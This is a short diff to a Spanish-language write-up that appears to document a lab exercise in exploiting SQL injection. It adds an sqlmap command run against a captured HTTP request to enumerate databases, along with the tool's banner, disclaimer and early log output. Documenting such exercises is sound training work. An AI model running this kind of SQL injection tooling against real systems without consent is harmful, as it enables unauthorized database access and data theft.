@@ -56,7 +56,26 @@ Utilizando la herramienta SQLMap realizamos la autoexplotación de la vulnerabil
 ![](../../../Images/Pasted%20image%2020240923103040.png)
 
 
-Ahora pasamos la petición a SLQMap.
+Ahora pasamos la petición a SLQMap y le dejamos trabajar.
+
+```
+> sqlmap -r req.txt --dbs                                                       
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.8.3#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:31:17 /2024-09-23/
+
+[12:31:17] [INFO] parsing HTTP request from 'req.txt'
+[12:31:18] [WARNING] provided value for parameter 'submit' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
+[12:31:18] [INFO] resuming back-end DBMS 'mysql' 
+[12:31:18] [INFO] testing connection to the target URL
+```
 
 
 
